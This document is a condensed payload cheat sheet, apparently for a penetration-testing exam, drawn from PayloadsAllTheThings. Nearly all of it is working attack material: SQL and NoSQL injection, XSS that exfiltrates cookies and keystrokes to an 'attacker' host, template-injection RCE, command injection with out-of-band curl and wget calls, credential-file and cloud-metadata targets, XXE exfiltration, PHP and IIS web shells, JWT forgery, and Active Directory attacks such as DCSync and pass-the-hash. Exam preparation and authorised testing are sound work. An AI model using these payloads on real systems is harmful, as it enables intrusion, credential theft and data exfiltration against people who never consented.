# PayloadsAllTheThings - Condensed Reference

> The full PayloadsAllTheThings repository is at https://github.com/swisskyrepo/PayloadsAllTheThings (~600MB). **Before the exam, clone it (`git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git`) and zip it for upload to CRESTDrive.** It contains hundreds of payload files organised by vulnerability class.
>
> This file is a condensed quick-reference of the payloads you are most likely to need under time pressure. For payloads not listed here, refer to the full repo.

---

## SQL Injection

### Detection probes (try each)

```sql
'
"
'--
'#
') --
') #
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR 1=1--
admin' OR 1=1#
admin') OR ('1'='1
admin')) OR (('1'='1
1' AND 1=1--
1' AND 1=2--
\
';select pg_sleep(5)--
';WAITFOR DELAY '0:0:5'--
'/**/OR/**/'1'='1
'+OR+'1'='1
%27+OR+%271%27%3D%271
1' RLIKE SLEEP(5)--
```

### Authentication bypass

```sql
admin'--
admin' #
admin'/*
' or 1=1--
' or 1=1#
" or "1"="1
" or "1"="1"--
') or '1'='1--
') or ('1'='1--
admin' AND 1=0 UNION SELECT 'admin', '5f4dcc3b5aa765d61d8327deb882cf99'--
```

### MySQL specific

```sql
-- Version
SELECT @@version;
SELECT version();
SELECT @@version_compile_os;

-- Current user / db
SELECT user();
SELECT current_user();
SELECT database();
SELECT @@hostname;
SELECT @@datadir;

-- Time-based
'-SLEEP(5)-'
'AND IF(1=1,SLEEP(5),0)--
'AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--

-- Error-based via extractvalue
'AND extractvalue(1,concat(0x7e,(SELECT version())))--
'AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--

-- File read
SELECT LOAD_FILE('/etc/passwd');
'UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--

-- File write (FILE privilege required)
'UNION SELECT '<?php system($_GET[c]); ?>',null,null INTO OUTFILE '/var/www/html/shell.php'--

-- Schema enum
'UNION SELECT NULL,table_name FROM information_schema.tables--
'UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--

-- Comment alternatives
-- (double dash space)
#
/* */
;%00
```

### MSSQL specific

```sql
-- Version
SELECT @@version;
SELECT @@SERVERNAME;

-- Time-based
';WAITFOR DELAY '0:0:5'--
';IF (1=1) WAITFOR DELAY '0:0:5'--

-- Stack queries (MSSQL supports them)
';EXEC xp_cmdshell 'whoami';--
';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--

-- xp_dirtree NTLM capture
';EXEC xp_dirtree '\\10.10.14.5\share';--

-- Linked server
';SELECT * FROM OPENQUERY([linked],'SELECT @@version');--
';EXEC ('xp_cmdshell ''whoami''') AT [linked];--

-- Error-based via convert
'AND 1=convert(int,(SELECT @@version))--

-- Schema enum
'UNION SELECT NULL,name FROM sys.databases--
'UNION SELECT NULL,name FROM sys.tables--
'UNION SELECT NULL,name FROM sys.columns WHERE object_id=OBJECT_ID('users')--
```

### PostgreSQL specific

```sql
-- Version
SELECT version();
SELECT current_user;
SELECT current_database();

-- Time-based
';SELECT pg_sleep(5);--
'AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Command execution (superuser)
';CREATE TABLE cmd(o text);COPY cmd FROM PROGRAM 'whoami';SELECT * FROM cmd;--
';COPY (SELECT '') TO PROGRAM 'whoami';--

-- File read
';COPY (SELECT '') FROM '/etc/passwd';--
SELECT pg_read_file('/etc/passwd');

-- Schema enum
'UNION SELECT NULL,table_name FROM information_schema.tables--
'UNION SELECT NULL,datname FROM pg_database--
```

### Oracle specific

```sql
-- Version
SELECT * FROM v$version;
SELECT banner FROM v$version WHERE rownum=1;
SELECT user FROM dual;

-- Time-based
'AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='1
'AND 1=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--

-- Schema enum
'UNION SELECT NULL,banner FROM v$version--
'UNION SELECT NULL,table_name FROM all_tables--
'UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS'--

-- Note: Oracle requires FROM clause; use FROM dual for non-table queries
```

### sqlite specific

```sql
SELECT sqlite_version();
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE name='tablename';
```

### NoSQL injection (MongoDB)

```javascript
// Login bypass
{ "username": "admin", "password": { "$ne": null } }
{ "username": "admin", "password": { "$ne": "anything" } }
{ "username": "admin", "password": { "$gt": "" } }
{ "username": { "$regex": "^a" }, "password": { "$ne": "" } }

// URL form (when JSON params accepted)
?username[$ne]=null&password[$ne]=null
?username[$regex]=^a&password[$ne]=null

// Operator-based
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000) || true"}     // time-based detection
```

---

## Cross-Site Scripting (XSS)

### Basic detection probes

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
javascript:alert(1)
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
'-alert(1)-'
"-alert(1)-"
```

### Filter bypasses

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x onERRor=alert(1)>

<!-- Backticks instead of parens -->
<svg onload=alert`1`>
<img src=x onerror=alert`1`>

<!-- HTML entities -->
<img src=x onerror=&#97;lert(1)>
<img src=x onerror=&#x61;lert(1)>

<!-- No quotes -->
<svg onload=alert(/1/)>
<svg/onload=alert(1)>

<!-- Without word "script" -->
<a onmouseover=alert(1)>X</a>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>

<!-- Attribute breakouts -->
" autofocus onfocus=alert(1) x="
" onmouseover="alert(1)
'></textarea><script>alert(1)</script>
"><svg onload=alert(1)>

<!-- Encoding -->
<a href="javascript:alert(1)">click</a>
<a href="java&Tab;script:alert(1)">click</a>
<a href="java&NewLine;script:alert(1)">click</a>
<a href="javasc&#9;ript:alert(1)">click</a>

<!-- Polyglot (works in many contexts) -->
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

### Cookie / data exfiltration

```html
<script>new Image().src='http://attacker/?c='+encodeURIComponent(document.cookie)</script>
<script>fetch('http://attacker/?c='+encodeURIComponent(document.cookie))</script>
<svg onload="fetch('http://attacker/?c='+document.cookie)">
<script>navigator.sendBeacon('http://attacker/', document.cookie)</script>
```

### Page-content theft

```html
<script>
fetch('/admin/users')
  .then(r => r.text())
  .then(t => fetch('http://attacker/?d=' + btoa(t)));
</script>
```

### CSRF token theft

```html
<script>
fetch('/admin/users')
  .then(r => r.text())
  .then(t => {
    var token = t.match(/name="csrf" value="([^"]+)"/)[1];
    fetch('/admin/delete-user', {
      method: 'POST',
      body: 'csrf=' + token + '&id=victim',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'}
    });
  });
</script>
```

### Keylogger

```html
<script>
document.addEventListener('keypress', function(e) {
  fetch('http://attacker/?k=' + e.key);
});
</script>
```

### DOM-based XSS sources & sinks

**Sources** (attacker-controlled):
- `document.location.hash`
- `document.location.search`
- `document.URL`
- `document.cookie`
- `document.referrer`
- `window.name`
- `localStorage`, `sessionStorage`
- `postMessage` data

**Sinks** (cause execution):
- `eval()`
- `Function()` constructor
- `setTimeout(string, ...)`, `setInterval(string, ...)`
- `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`
- `element.src` (for script, iframe with javascript:)
- `location` / `location.href` / `location.assign()` / `location.replace()`
- jQuery `$()`, `.html()`, `.append()`, `.prepend()`, `.before()`, `.after()`, `.replaceWith()`

---

## Server-Side Template Injection (SSTI)

### Detection probes

```
{{7*7}}              -> 49 = Jinja2, Twig
${7*7}               -> 49 = Freemarker, Smarty
<%= 7*7 %>           -> 49 = ERB
#{7*7}               -> 49 = Ruby, Java
*{7*7}               -> 49 = Spring SpEL
@(7*7)               -> 49 = Razor
<#=7*7#>             -> 49 = T4
{{7*'7'}}            -> 7777777 = Jinja2 specifically
${7*'7'}             -> error in Freemarker = Twig (vs literal in Freemarker)
```

### Jinja2 (Flask, Python) RCE

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}

{# Find subprocess.Popen index, then: #}
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate() }}

{# Or via builtins #}
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}

{# Or read files #}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

{# Self-closure #}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{# Config exposure #}
{{ config }}
{{ config.items() }}
```

### Twig (Symfony, Drupal 8+) RCE

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('passthru')}}
```

### Smarty (PHP) RCE

```smarty
{system('id')}
{php}echo `id`;{/php}
```

### Freemarker (Java) RCE

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java) RCE

```velocity
#set($e="exp")
#set($run = $e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))
$run.exec("id")
```

### ERB (Ruby) RCE

```erb
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
```

---

## OS Command Injection

### Linux command injection payloads

```bash
;id
&id
&&id
||id
|id
`id`
$(id)
%0aid               # newline (URL encoded)
%0d%0aid            # CRLF
;{id,}              # brace expansion
;cat${IFS}/etc/passwd     # IFS for space bypass
;c"a"t /etc/passwd        # quote splits
;\c\a\t /etc/passwd       # backslash splits
;/usr?n/?d                # glob

# Time-based blind
;sleep 5
&&sleep 5
$(sleep 5)
`sleep 5`

# Out-of-band
;curl http://attacker/$(whoami)
;nslookup $(whoami).attacker.com
;ping -c 1 attacker.com
;wget http://attacker/$(id|base64)
```

### Windows command injection

```cmd
& whoami
&& whoami
| whoami
|| whoami
%0a whoami
%0d%0a whoami

:: Time-based
& timeout /t 5
& ping -n 5 127.0.0.1

:: Out-of-band
& curl http://attacker/%USERNAME%
& powershell -c "(Invoke-WebRequest http://attacker/$(whoami)).Content"
```

### Filter bypasses

```bash
# When `cat` is filtered:
tac /etc/passwd        # reverse cat
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
nl /etc/passwd
xxd /etc/passwd | xxd -r
od -c /etc/passwd
hexdump /etc/passwd
od -An -c /etc/passwd
strings /etc/passwd
sed -n '1,$p' /etc/passwd
awk '{print}' /etc/passwd
grep '' /etc/passwd

# When spaces are blocked:
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
cat</etc/passwd

# When slashes are blocked:
cd ${HOME%%u*}
cd $(echo /etc)

# When command is blocked, alternate forms
$0      # = bash (in bash context)
${PATH%%:*}/cat    # may construct /usr/local/sbin/cat etc.

# Base64
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
```

---

## Path Traversal / LFI

### Probes

```
../../../etc/passwd
../../../../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
/etc/passwd
/etc/passwd%00
/etc/passwd%00.png
....\\....\\....\\Windows\win.ini
..\..\..\Windows\win.ini
..%5C..%5C..%5CWindows%5Cwin.ini
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
```

### High-value Linux files

```
/etc/passwd
/etc/shadow
/etc/group
/etc/sudoers
/etc/hosts
/etc/issue
/etc/motd
/etc/crontab
/etc/cron.d/*
/etc/ssh/sshd_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/version
/proc/net/tcp
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/USER/.bash_history
/home/USER/.ssh/id_rsa
/home/USER/.ssh/authorized_keys
/root/.bash_history
/root/.ssh/id_rsa
/var/www/html/wp-config.php
```

### High-value Windows files

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System.ini
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\SYSTEM
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep\sysprep.xml
C:\Windows\System32\sysprep\sysprep.inf
C:\Windows\Repair\SAM
C:\Windows\Repair\SYSTEM
C:\Users\USER\Desktop\
C:\Users\USER\NTUSER.DAT
C:\Documents and Settings\USER\
```

### PHP wrappers

```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://input                         # POST body becomes the file
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
expect://id                         # if expect extension
zip://shell.zip%23shell             # zip wrapper
phar://shell.phar/shell             # phar wrapper
```

### LFI to RCE techniques

1. **Log poisoning** (Apache access log via User-Agent):
   ```bash
   curl -A '<?php system($_GET["c"]); ?>' http://target/
   # Then: http://target/?file=/var/log/apache2/access.log&c=id
   ```

2. **/proc/self/environ** (older Linux): inject PHP via User-Agent, include environ

3. **PHP session file**: 
   ```
   /var/lib/php/sessions/sess_<phpsessid>
   /tmp/sess_<phpsessid>
   ```
   Inject PHP into a session value first.

4. **Mail spool**: send PHP to a local user, include `/var/mail/USER`

5. **PHP filter source disclosure** (read source code):
   ```
   ?file=php://filter/convert.base64-encode/resource=config.php
   ```

---

## SSRF

### Detection / probing

```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://127.0.0.1:22/
http://localhost:80/
http://[::1]/
http://[::ffff:127.0.0.1]/
```

### Cloud metadata

```bash
# AWS
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/

# AWS IMDSv2 (newer) requires token
# (You provide curl -H "X-aws-ec2-metadata-token: TOKEN" - hard via SSRF)

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google

# DigitalOcean
http://169.254.169.254/metadata/v1/

# Alibaba
http://100.100.100.200/latest/meta-data/

# Oracle Cloud
http://192.0.0.192/latest/
```

### Internal service probing

```
http://127.0.0.1:6379/         # Redis
http://127.0.0.1:9200/         # Elasticsearch
http://127.0.0.1:5984/         # CouchDB
http://127.0.0.1:9000/         # PHP-FPM
http://127.0.0.1:11211/stats   # Memcached (text protocol)
http://127.0.0.1:8080/         # Tomcat
http://127.0.0.1:9090/         # Prometheus
http://127.0.0.1:8500/         # Consul
http://127.0.0.1:2375/         # Docker REST API (no auth!)
```

### Filter bypasses

```
http://127.1                                # short form
http://0.0.0.0                              # all-zeros
http://127.0.0.0.1                          # extra octet (some parsers)
http://127.000.000.001                      # zero-padded
http://0177.0.0.1                           # octal
http://2130706433                           # decimal
http://0x7f.0.0.1                           # hex
http://[::1]                                # IPv6 loopback
http://[::ffff:127.0.0.1]                   # IPv4-mapped IPv6
http://localhost.attacker.com               # if attacker controls DNS, points to 127.0.0.1
http://attacker.com@127.0.0.1               # username trick (some parsers)
http://127.0.0.1#@target.com                # fragment trick
http://target.com.attacker.com              # if naive prefix match
//127.0.0.1                                 # protocol-relative
file:///etc/passwd                          # file scheme (if allowed)
gopher://127.0.0.1:6379/_INFO%0d%0aQUIT     # gopher protocol for raw bytes
```

---

## XXE

### Basic file read

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Out-of-band exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
  %xxe;
]>
<root></root>
```

`evil.dtd`:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://attacker/?x=%file;'>">
%eval;
%exfil;
```

### Blind XXE via error

```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#37; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

### XXE in SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Body>
<query>&xxe;</query>
</soap:Body>
</soap:Envelope>
```

### XXE via file upload (DOCX, XLSX, SVG)

DOCX/XLSX are zip archives containing XML. Modify `word/document.xml` (DOCX) or `xl/workbook.xml` (XLSX) to include XXE. SVG is XML directly.

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

## File Upload Bypasses

### Extension blacklist bypass

```
shell.php   shell.PhP    shell.PHP
shell.php5  shell.php7   shell.phtml  shell.phar  shell.pht
shell.php.jpg            # if AddHandler/AddType broken
shell.jpg.php
shell.php%00.jpg         # PHP < 5.3 null byte
shell.php\x00.jpg
shell.php.                # trailing dot
shell.php.\               # trailing dot+slash
shell.php.....           # multiple dots
shell.php/               # trailing slash
shell.asp                # try alternates
shell.aspx
shell.cer
shell.config             # often executable in IIS
shell.html               # for stored XSS
.htaccess                # configure to interpret
.user.ini                # PHP per-directory
web.config               # IIS
```

### Magic byte bypass

```bash
# Prepend GIF magic
echo -n 'GIF89a;' > shell.php
echo '<?php system($_GET["c"]); ?>' >> shell.php

# Or JPEG
printf '\xff\xd8\xff\xe0' > shell.php
echo '<?php system($_GET["c"]); ?>' >> shell.php

# Or PNG
printf '\x89PNG\r\n\x1a\n' > shell.php
echo '<?php system($_GET["c"]); ?>' >> shell.php
```

### Content-Type spoofing in Burp

Just change `Content-Type: application/x-php` to `Content-Type: image/jpeg` in the upload request.

### EXIF metadata embedding

```bash
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

### .htaccess upload (Apache)

```
AddType application/x-httpd-php .jpg
```

Then upload PHP code as `.jpg` and it will be executed.

### web.config upload (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<%@ Language=VBScript %>
<% Response.Write CreateObject("WScript.Shell").Exec("cmd /c " & Request.QueryString("c")).StdOut.ReadAll() %>
```

### SVG XSS (uploaded as image)

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

## XML External Entity (more)

### Billion laughs DoS

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
```

---

## CSRF PoC Templates

### GET-based

```html
<img src="http://target/transfer-money?to=attacker&amount=10000">
```

### POST-based

```html
<html>
<body>
<form action="http://target/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

### JSON request via fetch

```html
<script>
fetch('http://target/api/action', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({action:'pwn'})
});
</script>
```

---

## JWT Attacks

### alg: none

```
{
  "alg": "none",
  "typ": "JWT"
}
.
{
  "user": "admin"
}
.
```

(Empty signature, just the trailing dot)

### Weak HMAC secret

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

Common weak secrets to test: `secret`, `secretkey`, `mysecret`, `secret123`, `your-256-bit-secret`, the application name, the company name.

### Algorithm confusion (RS256 -> HS256)

If the server uses the public key to verify RS256, but you switch to HS256, the server will use the public key as the HMAC secret.

### kid parameter injection

```
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../../dev/null"
}
```

If the server reads the key from a file path based on `kid`, point at a known file (e.g. `/dev/null` -> empty key).

### jwk injection

```
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": { ... attacker-supplied public key ... }
}
```

If the server trusts the embedded jwk for verification, the attacker can sign with their own key.

### Tools

```bash
# jwt_tool - the standard
jwt_tool <token>                              # decode + checks
jwt_tool <token> -X a                         # alg:none
jwt_tool <token> -X k -pk public.pem          # algorithm confusion (HS/RS)
jwt_tool <token> -C -d wordlist.txt           # crack HMAC
jwt_tool <token> -T                           # tamper interactively

# Online: jwt.io for decode/encode
```

---

## Active Directory Specific Attacks

### Kerberoast

```bash
impacket-GetUserSPNs -dc-ip 10.10.10.10 -request corp.local/user:'pass' \
  -outputfile spn.txt
hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP roast

```bash
impacket-GetNPUsers -dc-ip 10.10.10.10 corp.local/user:'pass' -request \
  -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Or no creds - against a list of usernames
impacket-GetNPUsers -dc-ip 10.10.10.10 corp.local/ -usersfile users.txt \
  -no-pass -format hashcat -outputfile asrep.txt
```

### Password spray

```bash
kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.txt 'Spring2025!'
nxc smb 10.10.10.10 -u users.txt -p 'Spring2025!' --continue-on-success
```

### DCSync

```bash
impacket-secretsdump -just-dc-ntlm corp.local/admin:'pass'@10.10.10.10
impacket-secretsdump -just-dc-user krbtgt corp.local/admin:'pass'@10.10.10.10
```

### Pass the hash

```bash
impacket-psexec -hashes :NTLM_HASH admin@10.10.10.50
evil-winrm -i 10.10.10.50 -u admin -H NTLM_HASH
nxc smb 10.10.10.50 -u admin -H NTLM_HASH --local-auth
```

### Pass the ticket

```bash
# Get TGT
impacket-getTGT corp.local/user:'pass'

# Use it
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass user@host.corp.local
```

---

## Windows Privesc Specific

### PrintNightmare exploit

```bash
# CVE-2021-1675 / 2021-34527
git clone https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py corp.local/user:pass@10.10.10.50 '\\10.10.14.5\share\addCube.dll'
```

### PetitPotam (force NTLM auth from DC)

```bash
python3 PetitPotam.py 10.10.14.5 10.10.10.10
# Then capture/relay the NTLM
```

### NoPac (sAMAccountName confusion)

```bash
# CVE-2021-42278 + CVE-2021-42287
python3 noPac.py corp.local/user:'pass' -dc-ip 10.10.10.10 --impersonate Administrator -shell
```

---

## Reverse Shell / Web Shell References

These are extensive enough to live in their own file. See `04_reverse_shells.md`.

---

## Final Notes

- This file is condensed. The full PayloadsAllTheThings repo has hundreds more.
- For each vulnerability class, work from generic to specific - try the simple probes first, then escalate to filter bypasses if blocked.
- Always work web payloads through Burp Repeater - copy/paste from this file into the request, modify, send.
